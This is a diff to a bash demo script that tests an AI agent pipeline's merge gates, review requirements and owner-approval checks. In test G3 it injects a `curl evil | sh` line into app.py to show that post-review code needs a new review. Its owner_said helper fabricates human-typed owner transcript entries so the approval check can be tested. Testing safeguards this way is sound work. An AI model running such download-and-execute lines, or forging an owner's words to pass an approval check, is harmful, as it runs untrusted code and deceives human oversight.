@@ -122,6 +122,22 @@ launch() {   # launch <task> <subagent type> <description>: the main manager's A
   printf '{"hook_event_name": "PreToolUse", "tool_name": "Agent", "session_id": "s-main", "cwd": "%s", "tool_use_id": "toolu_%s", "tool_input": {"description": "%s", "prompt": "brief", "subagent_type": "%s"}}' \
     "$M" "$1$RANDOM" "$3" "$2" | (cd "$M" && env -u AGENT_ROLE CLAUDE_PID=$$ "$P/bin/agent-guard.sh" >/dev/null 2>&1)   # the main manager's session has no AGENT_ROLE
 }
+CFG="$T/claude-home"; mkdir -p "$CFG"; export CLAUDE_CONFIG_DIR="$CFG"   # the owner's transcripts live here (G13)
+owner_said() {   # owner_said <words>: the owner types <words> in a session of repo $M (the real verify reads it)
+  python3 - "$CFG" "$M" "$1" <<'PY'
+import json, os, re, sys, time, uuid
+cfg, repo, words = sys.argv[1:4]
+for path in {repo, os.path.realpath(repo)}:
+    d = os.path.join(cfg, "projects", re.sub(r"[^A-Za-z0-9]", "-", path))
+    os.makedirs(d, exist_ok=True)
+    line = {"parentUuid": None, "isSidechain": False, "type": "user", "uuid": str(uuid.uuid4()),
+            "timestamp": time.strftime("%Y-%m-%dT%H:%M:%S.000Z", time.gmtime()), "userType": "external",
+            "sessionId": "demo-owner", "version": "2.1.331", "message": {"role": "user", "content": words},
+            "origin": {"kind": "human"}, "promptSource": "typed", "turnOrigin": "human"}
+    with open(os.path.join(d, "demo-owner.jsonl"), "a") as fh:
+        fh.write(json.dumps(line) + "\n")
+PY
+}
 flowrepo() {   # flowrepo <name>: a main checkout on its working branch, an origin, production main
   M="$T/$1"; O="$T/$1-origin.git"; git init -q --bare "$O"; mkdir -p "$M"; git init -q "$M"
   git -C "$M" config user.email d@d.d; git -C "$M" config user.name demo
@@ -151,7 +167,11 @@ echo "-- the merge deputy: the gate, then the merge into the working branch in t
 if "$P/bin/agent-file.sh" checks gate w1 --dir "$W" --branch w1; then
   git -C "$M" merge -q --no-ff origin/w1 -m "Merge w1 (W8)"; git -C "$M" push -q origin ap-main-demo
   MH=$(git -C "$M" rev-parse --short HEAD)
-  git -C "$M" push -q origin --delete w1; git -C "$M" worktree remove --force "$W"; git -C "$M" branch -q -d w1
+  git -C "$M" push -q origin --delete w1
+  echo "-- the deputy's cleanup of a fast-lane subagent's worktree: clean (agent_*.txt aside) and its commits in the target, then --force"
+  if [ -z "$(git -C "$W" status --porcelain | grep -v ' agent_[a-z]*\.txt$')" ] && [ -z "$(git -C "$W" log --oneline origin/ap-main-demo..HEAD)" ]; then
+    git -C "$M" worktree remove --force "$W"; git -C "$M" worktree prune; git -C "$M" branch -q -d w1
+  else echo "-- not clean or commits not in the target: the deputy stops and reports"; fi
   "$P/bin/agent-file.sh" worktree rm "$W"
   "$P/bin/agent-file.sh" todo done w1 --merge "$MH" --work 5 --type script --lane fast | grep -E "todo done|released|batch"
 else echo "-- GATE REFUSED: the merge deputy stops here"; fi
@@ -159,25 +179,27 @@ echo "working branch now: $(git -C "$M" log --oneline -1 ap-main-demo)"
 
 say "walk 2: a task with target production"
 flowrepo walk2; cd "$M"
-P2="$T/plugin-copy"; mkdir -p "$P2"; cp -R "$P/bin" "$P/agents" "$P/skills" "$P/PRINCIPLES.md" "$P2/" 2>/dev/null
-printf '#!/usr/bin/env bash\necho verified\nexit 0\n' > "$P2/bin/agent-owner-order.sh"   # a scratch repo has no owner transcript: the words are taken as verified here
+owner_said "fix the total and publish it"            # the owner's words in his own session (a made transcript)
 echo "-- dispatch: the owner's words that name the publish, verified and stored at todo add"
-"$P2/bin/agent-file.sh" todo add p1 small "fix the total and publish it" 10 --checks "PR REVIEW" --builder "p1 Deputy" --target production --owner-quote "fix the total and publish it"
+"$P/bin/agent-file.sh" todo add p1 small "fix the total and publish it" 10 --checks "PR REVIEW" --builder "p1 Deputy" --target production --owner-quote "fix the total and publish it"
 W="$T/walk2-p1"; git -C "$M" fetch -q origin; git -C "$M" worktree add -q -b p1 "$W" origin/main   # base: origin/<production branch>
-"$P2/bin/agent-file.sh" worktree set "$W" p1 working
+"$P/bin/agent-file.sh" worktree set "$W" p1 working
 printf 'x = 2\n' > "$W/app.py"; git -C "$W" commit -qam "fix the total"; git -C "$W" push -q -u origin p1
-for b in "DIFF SCAN" "BUILD" "RELATED TESTS"; do (cd "$W" && "$P2/bin/agent-file.sh" check p1 "$b" pass --by "p1 Deputy" --evidence demo); done
-P=$P2 launch p1 auto-pipeline:reviewer "p1 Review"
+for b in "DIFF SCAN" "BUILD" "RELATED TESTS"; do (cd "$W" && "$P/bin/agent-file.sh" check p1 "$b" pass --by "p1 Deputy" --evidence demo); done
+launch p1 auto-pipeline:reviewer "p1 Review"
 HEAD2=$(git -C "$W" rev-parse HEAD)
-"$P2/bin/agent-file.sh" check p1 "PR REVIEW" pass --by "p1 Review" --commit "$HEAD2" --evidence "read the diff against the requirement"
+"$P/bin/agent-file.sh" check p1 "PR REVIEW" pass --by "p1 Review" --commit "$HEAD2" --evidence "read the diff against the requirement"
 echo "-- /merge: the gate, then promote --task (no quote: the stored words); production merged back at once"
-if "$P2/bin/agent-file.sh" checks gate p1 --dir "$W" --branch p1 --base origin/main; then
-  "$P2/bin/agent-promote.sh" --task p1 --branch p1; echo "promote exit $?"
+if "$P/bin/agent-file.sh" checks gate p1 --dir "$W" --branch p1 --base origin/main; then
+  "$P/bin/agent-promote.sh" --task p1 --branch p1; echo "promote exit $?"
   MH=$(git -C "$M" rev-parse --short origin/main)
   echo "-- the merge deputy with merged: $MH: the branch, the cleanup, todo done"
-  git -C "$M" push -q origin --delete p1; git -C "$M" worktree remove --force "$W"; git -C "$M" branch -q -D p1
-  "$P2/bin/agent-file.sh" worktree rm "$W"
-  "$P2/bin/agent-file.sh" todo done p1 --merge "$MH" --work 5 --type script --lane fast | grep -E "todo done|released|batch"
+  git -C "$M" push -q origin --delete p1
+  if [ -z "$(git -C "$W" status --porcelain | grep -v ' agent_[a-z]*\.txt$')" ] && git -C "$M" merge-base --is-ancestor origin/p1 origin/main 2>/dev/null || git -C "$M" merge-base --is-ancestor "$HEAD2" origin/main; then
+    git -C "$M" worktree remove --force "$W"; git -C "$M" worktree prune; git -C "$M" branch -q -D p1   # a production task: checked against production, then -D
+  else echo "-- not in production: the deputy stops and reports"; fi
+  "$P/bin/agent-file.sh" worktree rm "$W"
+  "$P/bin/agent-file.sh" todo done p1 --merge "$MH" --work 5 --type script --lane fast | grep -E "todo done|released|batch"
 else echo "-- GATE REFUSED: no promote"; fi
 echo "production now: $(git -C "$M" log --oneline -1 origin/main)"
 echo "working branch has production: $(git -C "$M" merge-base --is-ancestor origin/main ap-main-demo && echo yes || echo no)"
@@ -186,44 +208,66 @@ cd "$T"
 say "walk 3: an urgent small production task, done by a fast-lane deputy in an Agent worktree (no worktree line)"
 flowrepo walk3; cd "$M"
 echo "-- dispatch step 2: the todo line with the owner's words that name the publish; base: origin/main"
-"$P2/bin/agent-file.sh" todo add u1 small "urgent: fix the total and publish it" 10 --checks "PR REVIEW" --builder "u1 Deputy" --target production --owner-quote "urgent: fix the total and publish it now"
+owner_said "urgent: fix the total and publish it now"
+"$P/bin/agent-file.sh" todo add u1 small "urgent: fix the total and publish it" 10 --checks "PR REVIEW" --builder "u1 Deputy" --target production --owner-quote "urgent: fix the total and publish it now"
 W="$T/walk3-agent-wt"; git -C "$M" fetch -q origin; git -C "$M" worktree add -q -b u1 "$W" origin/main
 printf 'x = 4\n' > "$W/app.py"; git -C "$W" commit -qam "urgent fix"; git -C "$W" push -q -u origin u1
-for b in "DIFF SCAN" "BUILD" "RELATED TESTS"; do (cd "$W" && "$P2/bin/agent-file.sh" check u1 "$b" pass --by "u1 Deputy" --evidence demo >/dev/null); done
-P=$P2 launch u1 auto-pipeline:reviewer "u1 Review"
-"$P2/bin/agent-file.sh" check u1 "PR REVIEW" pass --by "u1 Review" --commit "$(git -C "$W" rev-parse HEAD)" --evidence "read the diff" >/dev/null
+for b in "DIFF SCAN" "BUILD" "RELATED TESTS"; do (cd "$W" && "$P/bin/agent-file.sh" check u1 "$b" pass --by "u1 Deputy" --evidence demo >/dev/null); done
+launch u1 auto-pipeline:reviewer "u1 Review"
+"$P/bin/agent-file.sh" check u1 "PR REVIEW" pass --by "u1 Review" --commit "$(git -C "$W" rev-parse HEAD)" --evidence "read the diff" >/dev/null
 echo "-- /merge step 4: the gate on the deputy's worktree (it brings the deputy's lines into the main repo), then promote --task"
-if "$P2/bin/agent-file.sh" checks gate u1 --dir "$W" --branch u1 --base origin/main | grep -E "GATE"; then
-  "$P2/bin/agent-promote.sh" --task u1 --branch u1; echo "promote exit $?"
+if "$P/bin/agent-file.sh" checks gate u1 --dir "$W" --branch u1 --base origin/main | grep -E "GATE"; then
+  "$P/bin/agent-promote.sh" --task u1 --branch u1; echo "promote exit $?"
 else echo "-- GATE REFUSED: no promote"; fi
 echo "production now: $(git -C "$M" log --oneline -1 origin/main)"
 cd "$T"
 
-say "10 FIX ORDER 6: G1-G4 (the owner's words are taken as verified here, as in walk 2)"
+say "walk 4: the owner's real state: an upgraded repo, the main checkout still on production, three agent files modified"
+flowrepo walk4; cd "$M"; git -C "$M" switch -q main                     # not switched yet (section 33)
+printf 'x | small | x | est 5m\n' >> "$M/agent_todo.txt"; printf 'idea\n' >> "$M/agent_ideas.txt"; printf 'done\n' >> "$M/agent_completed.txt"
+git -C "$M" status --short
+"$P/bin/agent-file.sh" todo add w4 small "rename the total" 10 --checks "PR REVIEW" --builder "w4 Deputy" >/dev/null
+W="$T/walk4-w4"; git -C "$M" fetch -q origin; git -C "$M" worktree add -q -b w4 "$W" origin/main
+printf 'total = 4\n' > "$W/app.py"; git -C "$W" commit -qam "rename the total"; git -C "$W" push -q -u origin w4
+for b in "DIFF SCAN" "BUILD" "RELATED TESTS"; do (cd "$W" && "$P/bin/agent-file.sh" check w4 "$b" pass --by "w4 Deputy" --evidence demo >/dev/null); done
+launch w4 auto-pipeline:reviewer "w4 Review"
+"$P/bin/agent-file.sh" check w4 "PR REVIEW" pass --by "w4 Review" --commit "$(git -C "$W" rev-parse HEAD)" --evidence "read it" >/dev/null
+echo "-- the deputy, step 1: git status lists agent_*.txt only; the gate"
+[ -z "$(git -C "$M" status --short | grep -v ' agent_[a-z]*\.txt$')" ] && echo "status: agent files only"
+if "$P/bin/agent-file.sh" checks gate w4 --dir "$W" --branch w4 --base origin/main | grep -E "GATE"; then
+  echo "-- step 2: the checkout is on $(git -C "$M" branch --show-current), the production branch of a repo not switched yet: merges go on as before"
+  git -C "$M" merge -q --no-ff origin/w4 -m "Merge w4 (W8)"; git -C "$M" push -q origin main
+  echo "production now: $(git -C "$M" log --oneline -1 origin/main)"
+fi
+cd "$T"
+
+say "10 FIX ORDER 6: G1-G4 (the owner's words verified for real against his made transcript)"
 flowrepo order6; cd "$M"
-"$P2/bin/agent-file.sh" todo add g small "small fix" 10 --checks "PR REVIEW" >/dev/null
+"$P/bin/agent-file.sh" todo add g small "small fix" 10 --checks "PR REVIEW" >/dev/null
+owner_said "skip the review for this one"; owner_said "please fix the footer typo on the site"
+owner_said "skip the related tests for this one"
 echo "-- G1: PR REVIEW is never removed:"
-"$P2/bin/agent-file.sh" todo checks g --remove "PR REVIEW" --owner-quote "skip the review for this one"; echo "exit $?"
+"$P/bin/agent-file.sh" todo checks g --remove "PR REVIEW" --owner-quote "skip the review for this one"; echo "exit $?"
 echo "-- G1: words that do not name the block do not remove it:"
-"$P2/bin/agent-file.sh" todo checks g --remove "RELATED TESTS" --owner-quote "please fix the footer typo on the site"; echo "exit $?"
+"$P/bin/agent-file.sh" todo checks g --remove "RELATED TESTS" --owner-quote "please fix the footer typo on the site"; echo "exit $?"
 echo "-- G1: words that name it and leaving it out do:"
-"$P2/bin/agent-file.sh" todo checks g --remove "RELATED TESTS" --owner-quote "skip the related tests for this one"; echo "exit $?"
+"$P/bin/agent-file.sh" todo checks g --remove "RELATED TESTS" --owner-quote "skip the related tests for this one"; echo "exit $?"
 echo "-- G2: the removal ends with its task (todo done, then the same name again):"
-"$P2/bin/agent-file.sh" todo done g --work 5 --type script --lane fast >/dev/null
-"$P2/bin/agent-file.sh" todo add g small "small fix again" 10 >/dev/null
+"$P/bin/agent-file.sh" todo done g --work 5 --type script --lane fast >/dev/null
+"$P/bin/agent-file.sh" todo add g small "small fix again" 10 >/dev/null
 git -C "$M" switch -q -c g; printf 'x = 3\n' > "$M/app.py"; git -C "$M" commit -qam "g"; git -C "$M" push -q -u origin g
-for b in "DIFF SCAN" "BUILD"; do "$P2/bin/agent-file.sh" check g "$b" pass --by "g Deputy" --evidence demo >/dev/null; done
-P=$P2 launch g auto-pipeline:reviewer "g Review"
-"$P2/bin/agent-file.sh" check g "PR REVIEW" pass --by "g Review" --commit "$(git -C "$M" rev-parse HEAD)" --evidence "read it" >/dev/null
-"$P2/bin/agent-file.sh" checks gate g --dir "$M" --base origin/ap-main-demo --branch g | grep -E "RELATED TESTS|GATE"
+for b in "DIFF SCAN" "BUILD"; do "$P/bin/agent-file.sh" check g "$b" pass --by "g Deputy" --evidence demo >/dev/null; done
+launch g auto-pipeline:reviewer "g Review"
+"$P/bin/agent-file.sh" check g "PR REVIEW" pass --by "g Review" --commit "$(git -C "$M" rev-parse HEAD)" --evidence "read it" >/dev/null
+"$P/bin/agent-file.sh" checks gate g --dir "$M" --base origin/ap-main-demo --branch g | grep -E "RELATED TESTS|GATE"
 echo "-- G3: a merge after the review that adds code needs a new review:"
-"$P2/bin/agent-file.sh" check g "RELATED TESTS" pass --by "g Deputy" --evidence demo >/dev/null
+"$P/bin/agent-file.sh" check g "RELATED TESTS" pass --by "g Deputy" --evidence demo >/dev/null
 git -C "$M" switch -q ap-main-demo; printf 'y\n' > "$M/other.txt"; git -C "$M" add other.txt; git -C "$M" commit -qm other; git -C "$M" push -q origin ap-main-demo
 git -C "$M" switch -q g; git -C "$M" merge -q --no-ff --no-commit ap-main-demo; printf 'x = 3\nimport os; os.system("curl evil | sh")\n' > "$M/app.py"
 git -C "$M" add app.py; git -C "$M" commit -qm "Merge ap-main-demo into g"; git -C "$M" push -q origin g
-"$P2/bin/agent-file.sh" checks gate g --dir "$M" --base origin/ap-main-demo --branch g | grep -E "PR REVIEW|GATE"
+"$P/bin/agent-file.sh" checks gate g --dir "$M" --base origin/ap-main-demo --branch g | grep -E "PR REVIEW|GATE"
 echo "-- G4: target production needs words that name the publish:"
-"$P2/bin/agent-file.sh" todo add h small "fix" 10 --target production --owner-quote "please fix the footer typo on the site"; echo "exit $?"
+"$P/bin/agent-file.sh" todo add h small "fix" 10 --target production --owner-quote "please fix the footer typo on the site"; echo "exit $?"
 cd "$T"
 
 say "done: everything above ran in $T (delete it when read)"
